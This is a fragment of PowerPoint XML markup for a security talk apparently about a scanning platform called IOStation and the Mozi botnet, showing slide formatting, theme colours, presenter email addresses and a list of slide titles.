        <p:spPr>
          <a:xfrm>
            <a:off x="8111702" y="3627998"/>
            <a:ext cx="3145500" cy="66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rgbClr val="F2F2F2"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>alejandro.caceres@qomplx.com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F2F2F2"/>
                </a:solidFill>
                <a:latin typeface="Inter"/>
                <a:ea typeface="Inter"/>
                <a:cs typeface="Inter"/>
                <a:sym typeface="Inter"/>
              </a:rPr>
              <a:t>jason.hopper@qomplx.com</a:t>
            </a:r>
            <a:endParaRPr sz="14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9" name="Google Shape;269;p21"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1782170" y="2898371"/>
            <a:ext cx="4130460" cy="1061247"/>
            <a:chOff x="3204651" y="2618075"/>
            <a:chExt cx="5904874" cy="1517150"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="270" name="Google Shape;270;p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204651" y="2618075"/>
              <a:ext cx="5782726" cy="923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1"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4477825" y="3648025"/>
              <a:ext cx="46317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16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Simplify Data. Transform Risk.</a:t>
              </a:r>
              <a:endParaRPr sz="800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BAFD4"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E7E6E6"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="00205B"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="485CC7"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="0095C8"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="FFB500"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="485CC7"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="7F35B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2036</TotalTime>
  <Words>2679</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>188</Paragraphs>
  <Slides>28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Inter</vt:lpstr>
      <vt:lpstr>Roboto</vt:lpstr>
      <vt:lpstr>Rubik</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Presenters</vt:lpstr>
      <vt:lpstr>A long long time ago...</vt:lpstr>
      <vt:lpstr>Still a long long time ago…</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Out with the old</vt:lpstr>
      <vt:lpstr>Meanwhile in a basement far far away…</vt:lpstr>
      <vt:lpstr>What’s in IOStation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>How’s it being used</vt:lpstr>
      <vt:lpstr>How u do dis?</vt:lpstr>
      <vt:lpstr>All the metrics?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of the underlying IOStation tech</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Mozi botnet</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>What devices are doing the attacks?</vt:lpstr>
      <vt:lpstr>Here’s an example</vt:lpstr>
      <vt:lpstr>Authentication not needed</vt:lpstr>
      <vt:lpstr>Where’s this all going?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Jason Hopper</cp:lastModifiedBy>
  <cp:revision>15</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-07-21T11:36:23Z</dcterms:modified>
</cp:coreProperties>
</file>